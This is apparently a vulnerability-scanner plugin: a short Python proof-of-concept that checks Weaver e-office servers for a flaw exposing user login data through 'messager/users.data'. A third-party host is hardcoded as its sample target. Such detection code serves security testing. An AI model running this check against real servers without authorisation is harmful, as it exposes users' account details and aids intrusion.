#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
author: Smeet
name: weaver_e-office information disclosure
refer: http://www.wooyun.org/bugs/wooyun-2015-0129483

'''
import base64



def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg
        
def audit(arg):
    payload = 'messager/users.data'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    result = base64.b64decode(res)[0:100]
    if code == 200 and 'users' in result and 'loginid' in result:
        security_hole(url) 
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://oa.sbtjt.com/')[1])